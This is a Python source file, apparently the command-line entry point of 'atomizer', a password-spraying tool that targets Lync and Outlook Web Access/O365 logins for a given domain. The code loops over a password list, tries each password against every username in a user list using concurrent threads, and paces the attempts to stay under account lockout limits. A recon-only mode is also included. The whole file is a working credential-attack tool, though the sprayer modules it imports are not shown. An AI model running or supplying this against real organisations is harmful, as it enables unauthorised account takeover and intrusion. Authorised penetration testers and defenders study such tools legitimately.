#!/usr/bin/env python3

"""
Usage:
    atomizer (lync|owa) <domain> --passwordfile PASSWORDFILE --userfile USERFILE [--max-tries TRIES] [--interval SECS] [--threads THREADS] [--debug]
    atomizer (lync|owa) <domain> --recon [--debug]
    atomizer -h | --help
    atomizer -v | --version

Arguments:
    domain     target domain

Options:
    -h, --help                       show this screen
    -v, --version                    show version
    -p, --passwordfile PASSWORDFILE  file containing passwords (one per line)
    -u, --userfile USERFILE          file containing usernames (one per line)
    -m, --max-tries CNT              maximum attempts before lockout
    -i, --interval SEC               delay between tries (seconds)
    -t, --threads THREADS            number of concurrent threads to use [default: 3]
    -d, --debug                      enable debug output
    --recon                          only collect info, don't password spray
"""

import logging
import signal
import asyncio
import concurrent.futures
import sys
from pathlib import Path
from docopt import docopt
import time
from core.utils.messages import *
from core.sprayers import Lync, OWA


class Atomizer:
    def __init__(self, loop, domain, threads=3, debug=False):
        self.loop = loop
        self.domain = domain
        self.sprayer = None
        self.threads = int(threads)
        self.debug = debug

        log_format = '%(threadName)10s %(name)18s: %(message)s' if debug else '%(message)s'

        logging.basicConfig(
            level=logging.DEBUG if debug else logging.INFO,
            format=log_format,
            stream=sys.stderr,
        )

        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.threads,
        )

    def lync(self):
        self.sprayer = Lync(
            domain=self.domain,
        )

    def owa(self):
        self.sprayer = OWA(
            domain=self.domain,
        )

    async def atomize(self, userfile, passwordfile, max_tries, interval):
        log = logging.getLogger('atomize')
        log.debug('atomizing...')

        attempt = 0
        start_ts = 0
        passwordfile_fd = open(passwordfile, 'r')
        for password in passwordfile_fd:
            if max_tries > 0 and attempt >= max_tries:
                elapsed = time.time() - start_ts
                delay = 0
                if interval > elapsed:
                    delay = interval - elapsed
                log.info(f"waiting for {delay} seconds...")
                time.sleep(delay)
                attempt = 1
            else:
                attempt += 1

            start_ts = time.time()

            log.debug('creating executor tasks')
            self.sprayer.password = password.strip()

            blocking_tasks = []
            userfile_fd = open(userfile, 'r')
            for email in userfile_fd:
                blocking_tasks.append(self.loop.run_in_executor(self.executor, self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth, email.strip()))

            log.debug('waiting for executor tasks')
            await asyncio.wait(blocking_tasks)
            log.debug('loop finished')

        log.debug('exiting...')

    def shutdown(self):
        self.sprayer.shutdown()


if __name__ == "__main__":
    args = docopt(__doc__, version="0.0.1dev")

    loop = asyncio.get_event_loop()

    atomizer = Atomizer(
        loop=loop,
        domain=args['<domain>'],
        threads=args['--threads'],
        debug=args['--debug']
    )

    if args['lync']:
        atomizer.lync()
    elif args['owa']:
        atomizer.owa()

    if not args['--recon']:
        passfile = Path(args['--passwordfile'])
        if not passfile.exists() or not passfile.is_file():
            print_bad("Path to --passfile invalid!")
            sys.exit(1)

        userfile = Path(args['--userfile'])
        if not userfile.exists() or not userfile.is_file():
            print_bad("Path to --userfile invalid!")
            sys.exit(1)

        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, atomizer.shutdown)

        max_tries = -1
        if args['--max-tries']:
            max_tries = int(args['--max-tries'])

        interval = 0
        if args['--interval']:
            interval = int(args['--interval'])

        loop.run_until_complete(atomizer.atomize(args['--userfile'], args['--passwordfile'], max_tries, interval))
        atomizer.shutdown()
